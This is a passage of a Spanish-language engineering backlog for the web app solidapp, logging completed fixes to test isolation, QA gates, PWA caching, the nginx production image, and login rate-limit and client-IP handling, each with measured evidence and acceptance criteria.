  - [x] Verificado **en la cámara real**: 0 vehículos fantasma, 0 tickets.
  - [x] 20 tests nuevos; suite, `ruff` y `mypy` en verde.

### T-53 · P1 — la suite del host tardaba 25 minutos y además fallaba por contaminación

- **Estado**: **completado** — la suite encuentra un Redis alcanzable y aísla de verdad
- **Contexto**: al medir la cifra de la suite para el CI (T-52), la del host se quedó **colgada con 0 % de CPU** y luego tardó 25+ minutos. No era el código: era el `conftest.py`.
- **La causa, medida**:
  - El `conftest.py` cogía la URL de Redis de `REDIS_URL` y, si no estaba, usaba `"redis://redis:6379/0"`: el **nombre del servicio de Docker**, que sólo resuelve **dentro** de la red de Docker. Desde el host (Windows) **no resuelve** y el intento tardaba **2,7 s** en fallar (el resolver del sistema).
  - Como el fixture de limpieza de contadores (`_clean_redis_counters`) corre en **TODOS** los tests, eran 585 × 2,7 s ≈ **26 minutos de espera pura** por un fallo de DNS.
  - Peor: la limpieza **no se hacía**. Los buckets de rate-limit (`rl:*`) no se aislaban, así que la suite veía los contadores **de la app que está en marcha en el mismo Redis** → 429 → `test_costs.py` y otros fallando. Es el "fallo intermitente" que el propio comentario del `conftest.py` describía desde el 2026-10-21, sin saber la causa.
- **El arreglo (3 cosas)**:
  1. **El `conftest.py` prueba candidatos y se queda con el que responde**: el `REDIS_URL` del entorno (en el CI, `redis://localhost:6379/0`), el nombre del servicio de Docker (que es donde corre la suite en el contenedor) y el puerto publicado en el host (`127.0.0.1:6379/0`, que es a donde se llega desde Windows). La comprobación es un `PING` con timeout de 1 s.
  2. **El fixture usa un cliente con timeout de socket corto** y, si Redis no está accesible, **no se reintenta en cada test** (un flag a nivel de módulo).
  3. El aislamiento por PID de la base de Redis (8..15) **ahora funciona en todas partes**: en el host también.
- **Criterios de aceptación**:
  - [x] La suite del host pasa de **25+ min a 6,7 min** (587 passed, 9 skipped), y **sin los fallos** de `test_costs.py` que aparecían por la contaminación.
  - [x] En el contenedor sigue funcionando igual (585 passed, 10 skipped en SQLite; 595 passed, 1 skipped contra PostgreSQL).
  - [x] El CI no cambia de comportamiento: allí `REDIS_URL` viene en el entorno y se usa el primer candidato.
  - [x] `ruff` y el escáner de texto en verde.

### T-54 · P1 — la QA recogía los errores de red y de consola, los imprimía y no fallaba

- **Estado**: **completado** — el veredicto cuenta también con las peticiones fallidas y los errores de consola
- **Contexto**: la QA visual ya recogía **dos** cosas que no llegan al veredicto: las **peticiones fallidas (4xx/5xx)** y los **errores de consola**. Los imprimía en el informe y en la salida… y devolvía el código 0. Es decir: una pantalla cuyo `fetch` devolviera un 500 (o con un error de JavaScript) dejaba **la puerta en verde**.
- **Por qué importa más de lo que parece**: la QA es la única puerta que mira la app **en funcionamiento**. Todo lo demás (la suite, los linters, las comprobaciones estáticas) ve el código; la QA ve **lo que el usuario ve**. Si el fetch de una pantalla falla, la pantalla se queda en blanco o vacía, y eso era exactamente lo que la puerta no valoraba.
- **Por qué no se vio antes**: en el entorno actual hay **0 peticiones fallidas y 0 errores de consola** (medido en las 26 pantallas × 5 anchos), así que la puerta "funcionaba" por casualidad. El fallo era **latente**: aparecería el primer día que un endpoint devolviera un 500.
- **El arreglo**:
  - El veredicto pasa a una función pura `_evaluar(resultados, errores_login)` que devuelve `(código, motivos)` y cuenta también las peticiones fallidas y los errores de consola.
  - **Sólo los *errores* de consola rompen la puerta; los *avisos* se informan pero no la rompen.** Una puerta que falla por ruido acaba apagada, y eso es peor que un aviso. (La diferencia se nota justo al arreglar esto: el handler de consola recogía `error` **y** `warning` en la misma lista.)
  - **Las peticiones que nunca reciben respuesta** (conexión rechazada, DNS, abortada) no emiten `response`: emiten `requestfailed`. Sin esa escucha, ese fallo era invisible para la puerta. Ahora se recogen como `SIN RESPUESTA <método> <url> (<motivo>)`.
  - **PERO `net::ERR_ABORTED` no es un fallo**: es el navegador cancelando una petición que la app ya no espera (al cambiar de pantalla antes de que termine el fetch, o al cerrar el **SSE** `/parkings/{id}/events`, que está abierto por diseño). Al añadir la escucha aparecieron 13 "fallos" que eran todos abortos: el SSE en las 5 anchuras y dos fetches al cambiar de pantalla. Las cancelaciones se cuentan aparte y se informan ("13 peticiones canceladas (no son fallos)"); el resto de fallos de red (conexión rechazada, DNS, reset, timeout) **sí** rompen la puerta.
  - La autoprueba de la QA pasa de 5 a **12 casos**: además de los del detector de desbordes, comprueba que una petición fallida, un error de consola y un fallo de login **ponen la puerta en rojo**, y que **un aviso de consola** y **una petición cancelada** no la rompen.
- **Criterios de aceptación**:
  - [x] La autoprueba demuestra que la puerta falla con una petición fallida, un error de consola y un fallo de login, y que **no** falla con un aviso (11 casos en verde).
  - [x] Las peticiones sin respuesta (`requestfailed`) se recogen y rompen la puerta.
  - [x] La QA real sigue en verde: 26 pantallas × 5 anchos, **0 peticiones fallidas y 0 errores de consola**.
  - [x] El informe y la salida de consola incluyen ahora el recuento de peticiones fallidas y de errores de consola.
  - [x] La meta-puerta sigue en verde (16 autopruebas, la de la QA incluida).

### T-55 · P1 — la caché del service worker nunca se purga, y el build se rompía en silencio

- **Estado**: **completado** — versión de caché por build, y el build falla si el precache se queda sin lista
- **Contexto (la caché)**: `frontend/public/sw.js` usaba `const VERSION = 'v1'` **fijo**. El plugin de Vite inyecta la lista de assets del build en `dist/sw.js`, así que el service worker **sí** se actualiza en cada despliegue (el byte cambia) → el `activate` borra las cachés cuyo nombre **no** sea el actual… pero como el nombre era siempre el mismo (`solidapp-estaticos-v1`), **nunca se borraba nada**: los assets de cada despliegue se acumulaban **para siempre** en el móvil del cliente. El handler `activate` existía exactamente para eso, pero no podía hacer nada.
- **Contexto (el build)**: el plugin hacía `sw.replace('/* __ASSETS_BUILD__ */', inyeccion)`. Si alguien renombraba ese marcador, el `replace` **no hacía nada y el build terminaba en verde**: la PWA se quedaba sin la lista de assets, la app abría sin conexión **pero en blanco**, y nadie se enteraba hasta que un cliente la instalaba.
- **El arreglo**:
  1. **La versión de la caché va dentro del nombre y cambia con cada build**: `const VERSION = 'v1-<hash>'`, donde el hash es el SHA-256 de la lista de assets (primeros 12 hex). Ahora el `activate` **sí** purga la caché anterior, que es justo lo que estaba para hacer. El hash es de **contenido**: el mismo build da el mismo nombre (idempotente) y un build con otro contenido da otro.
  2. **El build falla si falta el marcador** o si no encuentra la constante `VERSION` en `public/sw.js`, con un mensaje que dice qué hacer. Una PWA rota tiene que romper el build, no aparecer en producción.
- **Criterios de aceptación**:
  - [x] El build inyecta la versión: `36 assets para precachear (versión v1-a2283906863f)`, y el `dist/sw.js` la lleva.
  - [x] El hash es **estable** entre builds con el mismo contenido (verificado: dos builds seguidos → la misma versión).
  - [x] **Probado que el build falla** si se renombra el marcador: sale `error during build: solidapp-pwa-precache: no se encuentra el marcador "/* __ASSETS_BUILD__ */"…` con código 1 (antes: build verde y PWA rota).
  - [x] El build vuelve a pasar tras restaurar el marcador.

### T-56 · P1 — no había imagen de producción del frontend, y los requisitos del servidor no los cumplía nadie

- **Estado**: **completado** — imagen de producción (nginx) + verificación de los requisitos en el CI
- **Contexto**: el único `frontend/Dockerfile` era el de **desarrollo** (Vite con HMR), con un comentario que lo reconocía: *"para producción usaríamos `npm run build` + nginx, fuera del MVP"*. Pero `frontend/README.md` (§ PWA) documenta **los tres requisitos que tiene que cumplir el servidor estático** de producción (el manifiesto con su content-type, el service worker sin caché y el `index.html` sin caché) — y **nadie los cumplía**, porque no había servidor de producción: la QA del PWA servía el build con un `http.server` de usar y tirar.
- **El arreglo (3 cosas)**:
  1. **`frontend/nginx/templates/default.conf.template`**: la configuración de nginx que cumple los tres requisitos, más el proxy de `/api` (el bundle usa rutas relativas a propósito), el fallback de la SPA (`try_files … /index.html`), el cacheo inmutable de los assets con hash y la sonda `/healthz`.
  2. **`frontend/Dockerfile.prod`**: imagen multi-etapa (node:20-alpine construye → nginx:1.27-alpine sirve), con `ENV API_UPSTREAM` para el proxy y `HEALTHCHECK`.
  3. **`frontend/scripts/verificar_servidor_produccion.py`** + un paso en el job `docker-build` del CI: levanta la imagen y **comprueba de verdad** los requisitos contra el contenedor (no "debería funcionar": se mide).
- **Dos fallos que sólo aparecieron al verificar** (y que habrían roto la app en producción):
  - **`${API_UPSTREAM:-http://backend:8000}`**: el `envsubst` de la imagen de nginx sólo sustituye las variables que existen **tal cual** (no entiende la sintaxis `:-`), así que nginx se comía el texto y **no arrancaba**. El valor por defecto va ahora en el `ENV` de la imagen.
  - **El bloque `types` de nginx sustituye el mapa MIME heredado** (no lo amplía). Con el tipo del manifiesto declarado a nivel de `server`, el JS y el HTML se servían como `application/octet-stream` y **el navegador no ejecutaba el bundle**. El tipo del manifiesto se declara ahora **sólo** en su ubicación, y el resto conserva el mapa heredado.
- **Criterios de aceptación**:
  - [x] La imagen se construye (`solidapp-frontend:prod`) y el contenedor queda **healthy**.
  - [x] Los tres requisitos del README se cumplen **medidos** contra el contenedor: `application/manifest+json` + `no-store` en el manifiesto, `no-store` en `/sw.js`, `no-cache` en `/index.html`.
  - [x] El bundle se sirve como **`application/javascript`** (no `octet-stream`) y con `immutable`; el fallback de la SPA devuelve el shell en `/mis-tickets`; el proxy de `/api` responde (login a través del proxy → 200 con token).
  - [x] La QA del PWA sigue en verde y el build del frontend pasa.
  - [x] Paso nuevo en el job `docker-build` del CI que levanta la imagen y ejecuta el verificador (`actionlint` exit 0).

### T-57 · P1 — la puerta del servidor de producción no podía fallar, y el paso del CI tapaba su fallo

- **Estado**: **completado** — puerta en Python con autoprueba, y el paso del CI propaga su código de salida
- **Contexto (dos defectos, los dos en lo que se añadió en T-56)**:
  1. **La puerta no podía demostrar que detectaba lo que dice detectar.** Era un script `sh` que corría **dentro** del contenedor con el `wget` de busybox: no había `wget` en el host ni forma de inyectar un servidor de mentira, así que nadie podía comprobar que fallara. Contra la convención del repo ("toda puerta necesita una autoprueba"), era una puerta de mentira.
  2. **El paso del CI tapaba el fallo.** El `docker rm -f solidapp-fe-prod` de limpieza era el **último** comando del bloque `run:` → su código de salida (0) **enmascaraba** el fallo de la verificación: un servidor de producción roto habría pasado el CI en verde. Y en la réplica local el paso fallaba por otra causa (Git Bash convertía `/tmp/verificar.sh` en `C:/Users/…/Temp/verificar.sh`), o sea que la réplica local ejecutaba una orden **distinta** de la del CI.
- **El arreglo (4 cosas)**:
  1. **La puerta se reescribe en Python con la biblioteca estándar** (`frontend/scripts/verificar_servidor_produccion.py`): habla con el servidor por HTTP (no depende del `wget` de busybox ni de rutas del sistema de ficheros del contenedor) y añade `--autoprueba`. Comprueba los **cinco** requisitos: los tres del README, el bundle servido como JavaScript y el fallback de la SPA.
  2. **La autoprueba levanta un servidor de mentira escrito a mano** (no derivado de la configuración real de nginx: si saliera del mismo código, la puerta y el servidor podrían mentir a la vez y la autoprueba no demostraría nada). Devuelve exactamente lo contrario de lo exigido y comprueba que la puerta lo detecta.
  3. **El paso del CI propaga el código de salida**: `codigo=0; … || codigo=$?; docker rm … || true; exit $codigo`. El `rm` va **antes** y tolera su propio fallo.
  4. **`tools/ejecutar_ci_local.py` fija `MSYS_NO_PATHCONV=1` y `MSYS2_ARG_CONV_EXCL=*`**, para que Git Bash no convierta las rutas POSIX al pasarlas a programas Windows (si no, la réplica local ejecuta una orden distinta de la del CI y da falsos verdes).
- **Criterios de aceptación**:
  - [x] La autoprueba pasa: con un servidor correcto la puerta pasa 5/5 y con un servidor roto detecta 5/5.
  - [x] **Probado que la autoprueba falla** reintroduciendo el defecto: 5 mutaciones (cada requisito forzado a "aceptado", y uno forzado a "rechazado") → las 5 se detectan.
  - [x] **Probado contra un servidor real roto** (el mismo contenedor de producción con la plantilla de nginx mutada): la puerta falla en los 5 requisitos y sale con código 1.
  - [x] Contra el contenedor real (configuración buena) la puerta pasa 5/5.
  - [x] **El paso del CI sale en rojo cuando la puerta falla**: apuntando la puerta a un puerto sin servidor, la réplica local devuelve código 1 y dice *"el job 'docker-build' FALLARÍA en local"*.
  - [x] El job `docker-build` pasa entero en la réplica local, `actionlint` exit 0 y la autoprueba está en `tools/autopruebas.py`.

### T-58 · P1 — la QA del PWA verificaba la PWA sobre un servidor que no cumplía los requisitos del servidor

- **Estado**: **completado** — el servidor de la QA cumple los cinco requisitos, y la QA los mide
- **Contexto**: con la puerta de T-57 (que mide los requisitos del servidor de producción **por HTTP**) se pudo, por fin, **medir** los servidores que el repo usa de verdad. El resultado:
  - `npm run preview` (Vite): **5/5**.
  - El servidor de la QA del PWA (`frontend/scripts/qa_pwa.py`, que servía el build con el `SimpleHTTPRequestHandler` de la biblioteca estándar): **2/5**. Le faltaban el `no-store` del service worker, el `no-cache` del `index.html` y el fallback de la SPA (una ruta profunda devolvía 404 en vez del shell).
- **Por qué importa**: la QA del PWA comprueba que la app es instalable y que arranca sin red. Lo comprobaba **sobre un servidor que el usuario real no tiene**: sin `no-store`, el navegador del usuario se queda con el service worker viejo para siempre (el bundle obsoleto, el icono viejo, el despliegue nuevo que no se ve), y sin fallback de la SPA, cualquier ruta profunda (recargar en `/mis-tickets`) daba un 404 en vez de la app. La QA daba **verde** sobre un servidor roto.
- **El arreglo (2 cosas)**:
  1. `qa_pwa.py` sirve el build con un manejador propio que pone **las mismas cabeceras que el servidor de producción** (`no-store` en `/sw.js`, `no-cache` en `/index.html`, `immutable` en los assets con hash), declara el tipo del manifiesto de forma explícita (sin depender de la versión de Python) y tiene el **fallback de la SPA**.
  2. La QA **mide los cinco requisitos con la misma puerta del CI** (importa `verificar_servidor_produccion`, no reimplementa las comprobaciones: dos mediciones distintas darían un falso verde) y falla si el servidor no los cumple.
- **Criterios de aceptación**:
  - [x] Medido: `npm run preview` 5/5 y el servidor de la QA 2/5 antes del arreglo.
  - [x] La QA del PWA sigue en verde **y** ahora cumple 5/5 (los cinco requisitos, comprobados por la puerta).
  - [x] **Probado que la QA se pone en rojo** con un servidor que no cumple: contra el servidor viejo, la QA sale con código 1 y señala los 3 requisitos incumplidos.
  - [x] El README del frontend dice la verdad (qué servidores cumplen y cuántos), y ya no afirma que "el preview cumple las tres" sin medirlo.

### T-59 · P0 (seguridad) — el rate-limit de login se esquivaba cambiando el `Content-Type`

- **Estado**: **completado** — las dos vías de login pasan por el mismo limitador
- **Contexto**: `POST /auth/login` (JSON) tiene rate-limit por IP y email (10 intentos / 5 min, Sprint Fase 3C). `POST /auth/login/oauth` (form-urlencoded) hace **el mismo `verify_password` contra `User.email`** pero **no pasaba por el limitador** (`backend/app/api/v1/auth.py`: el `rate_limiter.check` estaba solo en la vía JSON).
- **Medido contra la API en marcha** (no era lectura de código):
  - Vía OAuth2: **15 intentos → 15 × 401 y ningún 429**.
  - Vía JSON: `[401, 401, 401, 401, 429, 429, …]` → el 429 llegaba en el quinto.
  Es decir: **cambiar el `Content-Type` de la petición esquivaba la protección de fuerza bruta**.
- **El arreglo**:
  1. El bloque del limitador se extrae a una función compartida (`_comprobar_rate_limit_login`) que **llaman las dos vías**: así no pueden volver a divergir.
  2. La vía OAuth2 añade `grant_type: "oauth_form"` al audit del bloqueo.
  3. Dos tests nuevos: la vía OAuth2 devuelve 429, y **alternar** las dos vías tampoco esquiva el límite (el bucket es el mismo).
- **Criterios de aceptación**:
  - [x] Medido contra la API en marcha: la vía OAuth2 nunca daba 429 (15 × 401) y la vía JSON sí.
  - [x] Después del arreglo, la vía OAuth2 da 429 en el **intento 11** (el mismo umbral que la vía JSON).
  - [x] Test de la vía OAuth2 (4 intentos con `max=3` → el 4º da 429).
  - [x] Test de que alternar las vías no esquiva el límite (2 por JSON + 2 por OAuth2 → el 4º da 429).
  - [x] **Probado que los tests detectan el defecto reintroducido** (quitando el limitador de la vía OAuth2): los dos fallan.
  - [x] Audit `rate_limited_login` en las dos vías.

### T-60 · P0 — nginx rechazaba con 413 las fotos de los incidentes (1 MB por defecto)

- **Estado**: **completado** — límite correcto en nginx + puerta que lo compara con el backend
- **Contexto**: nginx tiene un límite de tamaño de petición y, **si no se dice nada, es de 1 MB**. El backend acepta `incident_attachment_max_files` (3) ficheros de `incident_attachment_max_bytes` (10 MB) → 30 MB por petición, y el frontend acepta fotos de 10 MB.
- **Medido contra la imagen de producción**: una petición de **2 MB** devolvía `413 Request Entity Too Large` con un **HTML de nginx** y el backend **nunca la veía**. En desarrollo (Vite) no hay límite, así que el fallo sólo aparecía en producción: subir una foto de móvil a un incidente fallaba siempre, con un mensaje que no explicaba el motivo.
- **El arreglo**:
  1. `client_max_body_size 32m;` en el `location /api/` de la plantilla de nginx.
  2. **`tools/verificar_nginx_body_size.py`**: una puerta que compara el límite de nginx con el tope real del backend (leído del `config.py` con `ast`, sin importar el backend), porque los dos valores están en ficheros distintos y cada uno puede cambiar por su cuenta. Con `--autoprueba` (6 casos de mentira escritos a mano) y paso en el CI.
- **Criterios de aceptación**:
  - [x] Medido: 2 MB contra la imagen de producción → **413 de nginx**, el backend no lo veía.
  - [x] La puerta **detecta el defecto del repo** (sin la directiva: "nginx usa su default (1 MB) y el backend acepta 31457280 bytes").
  - [x] Autoprueba con 6 casos de mentira (1 MB, sin directiva, 32 MB, 30 MB, 60 MB y 60 contra 90): todos detectados.
  - [x] Con el arreglo, una petición de 2 MB **llega al backend** (401 con JSON del backend, no 413 de nginx).
  - [x] La puerta está en `tools/autopruebas.py` y en el job `docker-build` del CI.
  - [x] `actionlint` exit 0.

### T-61 · P0 — el correo de recuperación de contraseña llevaba un enlace a `localhost:5173`

- **Estado**: **completado** — la URL sale de un ajuste y la aplicación no arranca en producción si no está puesta
- **Contexto**: `backend/app/services/password_reset_email.py` tenía `_RESET_URL_BASE = "http://localhost:5173/recuperar-contrasena"` **hardcodeado**. En producción el cliente recibía un correo con un enlace a su propio localhost: el flujo de "olvidé mi contraseña" estaba roto de punta a punta. Y el comentario al lado decía *"Frontend (aún no implementado)"*, cuando la página ya existía en el router: el comentario quedó obsoleto y el enlace nunca se actualizó.
- **El arreglo**:
  1. Nuevo ajuste `FRONTEND_BASE_URL` (default `http://localhost:5173`, el de desarrollo).
  2. En `staging`/`production`, la aplicación **no arranca** si la URL no es real por HTTPS (mismo patrón que el secreto JWT: que falle al arrancar con un mensaje claro, en vez de mandar un enlace roto). El mensaje dice exactamente qué exportar.
  3. El enlace del correo sale del ajuste (`_reset_url_base()`).
  4. Tests: el enlace usa la URL configurada (y no contiene `localhost`), y la configuración rechaza la URL por defecto y una URL sin HTTPS en producción.
- **Criterios de aceptación**:
  - [x] Medido en el código: el enlace era una constante a `localhost:5173`.
  - [x] En producción, sin `FRONTEND_BASE_URL`, la aplicación **no arranca** (con el mensaje que dice qué exportar).
  - [x] El enlace del correo sale de `FRONTEND_BASE_URL` (test con `https://app.solidapp.es`).
  - [x] En desarrollo y test no se comprueba (el equipo de QA usa el valor por defecto a propósito).
  - [x] **Probado que los tests detectan el defecto reintroducido** (quitando el validador y volviendo a hardcodear el enlace): los 3 tests lo detectan.
  - [x] `ruff` y `mypy` en verde.

### T-62 · P1 (seguridad) — la IP del cliente la elegía el atacante, y tres endpoints auditaban la del proxy

- **Estado**: **completado** — el XFF se toma por el extremo fiable y la auditoría usa la IP real
- **Contexto (dos cosas)**:
  1. `app/core/ip.py` tomaba el **primer** elemento del `X-Forwarded-For`, que es justo el que escribe el cliente: mandando un XFF distinto en cada intento, cada intento caía en un bucket distinto del rate-limit de login y **la protección se esquivaba**. Y nginx **concatena** el XFF del cliente (`$proxy_add_x_forwarded_for`), de modo que el primero era el inyectado.
  2. Tres endpoints auditaban `request.client.host` (la IP del **proxy**) en vez de la del cliente: crear incidente, subir adjunto y alta manual de ticket. En producción, la trazabilidad de esas acciones era falsa.
- **El arreglo**:
  1. `get_real_ip` toma el **último** elemento del XFF (el que añade el proxy de confianza, el más cercano al backend: no lo puede elegir el cliente).
  2. nginx **sobreescribe** el XFF con `$remote_addr` en vez de concatenar: una sola IP y fiable. Documentado: si delante hay un CDN hay que activar el módulo `realip` de nginx.
  3. Los tres endpoints usan `get_real_ip(request)`.
  4. `backend/tests/test_ip.py` (6 tests) y un test funcional de la auditoría de incidentes.
- **Criterios de aceptación**:
  - [x] Test: con XFF de varios elementos se usa el **último**.
  - [x] Test: el atacante **no puede elegir** la IP (el último es siempre el del proxy).
  - [x] Test: sin proxy de confianza, el XFF se ignora (manda `client.host`).
  - [x] Test funcional: el audit del incidente guarda la IP del cliente, no la del proxy.
  - [x] **Probado que los tests detectan las dos mutaciones** (volver al primer elemento; volver a `request.client.host`).
  - [x] `ruff` y `mypy` en verde.

### T-63 · P1 — la imagen de producción se construía con el `node_modules` del host

- **Estado**: **completado** — `frontend/.dockerignore` + puerta del contexto de build
- **Contexto**: el contexto de build de `frontend/Dockerfile.prod` es `frontend/`, y Docker busca el `.dockerignore` **en la raíz del contexto**: el de la raíz del repositorio **no se aplica**. Sin un `frontend/.dockerignore`, el `COPY . .` de la etapa de build se llevaba el `node_modules` del host (en esta máquina, el de Windows: `@esbuild/win32-x64`) por encima del que acababa de instalar `npm ci`. La imagen que se construía en local **no era la misma que construye el CI** (que parte de un checkout limpio): el bundle que se despliega en una sucursal podía no ser el que verificó el CI.
- **El arreglo**:
  1. `frontend/.dockerignore` (excluye `node_modules`, `dist` y más).
  2. **`tools/verificar_contexto_build.py`**: puerta que exige que el `.dockerignore` del contexto exista y excluya `node_modules` y `dist`, y que el `Dockerfile.prod` no los copie a mano (las copias `--from=` sí valen). Con `--autoprueba` (6 casos de mentira) y paso en el CI.
- **Criterios de aceptación**:
  - [x] Medido: no existía `frontend/.dockerignore` y el `.dockerignore` de la raíz tiene `**/node_modules` (que no se aplica a este contexto).
  - [x] La imagen se reconstruye con el `.dockerignore` nuevo (build en verde) y la puerta del servidor de producción sigue pasando 5/5.
  - [x] Autoprueba con 6 casos de mentira: todos detectados.
  - [x] La puerta está en `tools/autopruebas.py` y en el job `docker-build` del CI.
  - [x] `actionlint` exit 0.

### T-64 · P1 — dos ajustes de tipo lista no se podían configurar con el formato que documenta el propio código

- **Estado**: **completado** — las listas aceptan el formato con comas (y también JSON)
- **Contexto**: `pydantic-settings` sólo entiende **JSON** para los campos de tipo lista. Así que `TRUSTED_PROXIES="172.16.0.0/12,10.0.0.0/8"` —el formato que dice el comentario del propio ajuste en `backend/app/core/config.py`— **fallaba al arrancar** con un `ValidationError`. Lo mismo con `HEARTBEAT_SKIP_URL_PREFIXES`.
- **Medido**: `Settings(TRUSTED_PROXIES="172.16.0.0/12,10.0.0.0/8")` → `ValidationError: Input should be a valid list`. El ajuste **parecía configurable y no lo era** (el patrón que este repo lleva dos docenas de ítems cazando).
- **Por qué importa**: `TRUSTED_PROXIES` es lo que le dice al backend qué IP es la del cliente y cuál la del proxy. Sin poder configurarlo, quien despliega en producción (con el nginx fuera de los rangos por defecto) se queda con **todos los usuarios compartiendo la misma IP** en el rate-limit de login (10 intentos / 5 min contados como si fueran la misma persona) y con la auditoría guardando la IP del proxy.
- **El arreglo**: un validador de campo que acepta los dos formatos (JSON y lista separada por comas), aplicado a `trusted_proxies` y `heartbeat_skip_url_prefixes`.
- **Criterios de aceptación**:
  - [x] Medido: el formato con comas daba `ValidationError` al arrancar.
  - [x] Las dos listas se configuran ahora con comas (test).
  - [x] JSON sigue funcionando (test).
  - [x] Una lista vacía se queda vacía (test).
  - [x] `TRUSTED_PROXIES` queda **visible en el `docker-compose.yml`**, para que quien despliegue lo vea sin tener que leer el código.
  - [x] `ruff` y `mypy` en verde.

### T-65 · P1 — dos suites en paralelo se rompían mutuamente los tests de rate-limit

- **Estado**: **completado** — cada ejecución toma su base de Redis con un lock
- **Contexto**: la suite aísla sus contadores de Redis en una base propia, elegida **por PID**: `8 + (os.getpid() % 8)` (`backend/tests/conftest.py`). Eso **no** garantiza que dos ejecuciones paralelas caigan en bases distintas: dos PIDs que difieren en un múltiplo de 8 comparten base.
- **Medido** (2026-10-22): las dos suites del host en paralelo (SQLite y PostgreSQL) → **5 fallos en cada una**, todos de rate-limit ("esperaba 429, obtuve 201"): cada suite borraba los contadores de la otra al limpiar, así que ninguna veía el 429 que esperaba. En solitario, las dos pasaban.
- **El arreglo**: cada ejecución **reclama** una base con un lock (`SET NX`, con caducidad de una hora por si el proceso muere sin soltarlo) y, si está ocupada, prueba la siguiente. Si no hay ninguna libre, error claro.
- **Criterios de aceptación**:
  - [x] Medido: dos suites del host en paralelo → 5 + 5 fallos de rate-limit (en solitario, las dos pasaban).
  - [x] Con el lock, **las dos suites en paralelo pasan las dos**.
  - [x] `ruff` en verde.
  - [x] La afirmación del `AGENTS.md` ("la suite aguanta dos ejecuciones en paralelo") es ahora cierta, no sólo para el resto de la suite sino también para los tests de rate-limit.

### T-66 · P1 — el modo PWA se quedaba "pegado" en el navegador: un admin quedaba encerrado en la vista de cliente

- **Estado**: **completado** — el flag es por pestaña, y la QA lo vigila
- **Contexto**: `frontend/src/pwa/mode.ts` guardaba el flag del modo PWA en **`localStorage`** y lo leía de ahí, **con prioridad sobre la señal real** (`display-mode: standalone`):
  1. un admin (o un gestor) que abría la app con `?pwa=1` (el flag que pone el `start_url` del manifiesto, y el de depuración) quedaba **encerrado** en las rutas de cliente **para siempre** en ese navegador, sin ninguna forma de volver al panel de administración salvo borrar el almacenamiento a mano;
  2. la señal "recordada" ganaba a la real, así que tampoco servía abrir la app en otra pestaña normal.
- **El arreglo**:
  1. el flag se recuerda en **`sessionStorage`** (la pestaña), no en `localStorage` (el navegador entero);
  2. el flag viejo se **borra** al arrancar: quien quedó encerrado sale solo al abrir la app;
  3. la señal fuerte (`display-mode: standalone` / `navigator.standalone`) se consulta **antes** que el flag.
- **La comprobación (en la QA visual, que sí tiene login y proxy)**:
  1. con `?pwa=1`, una ruta de admin redirige a "Mis tickets" (el modo está activo);
  2. en **otra pestaña** del mismo navegador (el `localStorage` se comparte entre pestañas, el `sessionStorage` no) y sin el flag, la ruta de admin se respeta: el modo no se ha quedado pegado.
  - Detalle que costó tres intentos: los tokens viven en `sessionStorage` (son por pestaña), así que la segunda pestaña **no tiene sesión** y acaba en `/login`: hay que copiarle el almacenamiento a mano (sin escribir ninguna clave de memoria) o la comprobación daría un falso verde.
  - Las dos comprobaciones van en **páginas propias**, sin los escuchadores de la QA: si contaminaran las listas de errores, la puerta se pondría en rojo por ruido ajeno.
- **Criterios de aceptación**:
  - [x] Medido: el flag se guardaba y se leía de `localStorage`, y la señal "recordada" tenía prioridad sobre la real.
  - [x] El flag pasa a `sessionStorage` y el flag viejo se borra (quien quedó encerrado sale solo).
  - [x] La QA visual comprueba que el modo PWA no se queda pegado (con el admin, en otra pestaña).
  - [x] **Probado que la QA se pone en rojo** reintroduciendo el defecto: *"el modo PWA se ha quedado pegado en el navegador: en otra pestaña la ruta de admin redirige a .../mis-tickets"*.
  - [x] La comprobación no mete ruido en el veredicto (0 peticiones fallidas y 0 errores de consola en la QA).
  - [x] `npm run lint` y `vue-tsc --noEmit` en verde.

### T-67 · P2 — en nginx, las regex de los ficheros estáticos ganaban al prefijo `/api/`

- **Estado**: **completado** — `location ^~ /api/`
- **Contexto**: en nginx, las locations de tipo **regex** (`location ~* \.(png|jpg|…)$`) se comprueban **antes** que las de prefijo. Sin el `^~`, una petición a `/api/v1/algo.png` la servía nginx **desde el disco** en vez de ir a la API.
- **Por qué importa aunque hoy no rompa**: los adjuntos van por `/attachments/{id}` (sin extensión) y los CSV/PDF no están en la lista de estáticos, así que hoy no hay ningún endpoint afectado. Pero es una trampa para el día que un endpoint devuelva una imagen (un QR de un ticket, un avatar): en producción serviría el fichero del disco (o un 404) en vez de la respuesta de la API.
- **El arreglo**: `location ^~ /api/` (el `^~` dice "si la URI empieza por este prefijo, usa este bloque y **no** compruebes las regex").
- **Criterios de aceptación**:
  - [x] Medido: el login a través del proxy `/api` de la imagen de producción devuelve **200 con token**, y una ruta inexistente de la API devuelve **404** (del backend, no el shell de la SPA): el prefijo sigue yendo al proxy.
  - [x] La puerta del servidor de producción sigue en **5/5** con la plantilla nueva.
  - [x] La imagen se reconstruye y el contenedor arranca con la plantilla nueva.

### T-68 · P1 — el flag `User.no_rate_limit` no hacía nada (las cuentas de servicio se comían un 429)

- **Estado**: **completado** — el flag se lee y la capacidad existe de verdad
- **Contexto**: el modelo `User` tiene el campo `no_rate_limit` con este comentario: *"service accounts (p.ej. cronjobs de carga inicial de datos) pueden saltarse el rate-limit de CRUDs sin tener que cambiar settings globales"*. Y el **mecanismo existía**: `EndpointRateLimiter.check(..., skip=True)` devuelve `(True, "skipped", 0)` sin tocar Redis, con su propio test (`tests/test_endpoint_rate_limit_skip.py`).
- **El problema**: **nadie leía el flag**. Ningún router pasaba `skip=True`, así que una cuenta de servicio se comía un 429 igual que un humano: el cronjob de carga inicial de datos fallaba a partir del sexto usuario.
- **Por qué no lo cazó nadie**: el test existente probaba el **mecanismo** (`skip=True` funciona), no el **comportamiento** (una cuenta con el flag no se bloquea). Verde sobre una capacidad inexistente.
- **El arreglo**: la función que aplica el rate-limit por endpoint consulta al actor y respeta su flag. Y se añade un test **por API** (no del mecanismo): un admin con `no_rate_limit=True` hace 5 altas seguidas sin un 429, y un admin normal sí recibe el 429.
- **Criterios de aceptación**:
  - [x] Medido: el test nuevo **fallaba** antes del arreglo (la cuenta de servicio recibía un 429).
  - [x] Con el arreglo, la cuenta de servicio hace 5 altas sin un 429.
  - [x] El caso contrario sigue igual: un usuario normal **sí** recibe el 429.
  - [x] La puerta `tools/verificar_rate_limit_unico.py` exige que el flag se lea en la aplicación (y no solo esté declarado en el modelo).
  - [x] `ruff` y `mypy` en verde.

### T-69 · P1 — el rate-limit por endpoint estaba copiado en seis sitios

- **Estado**: **completado** — una sola implementación
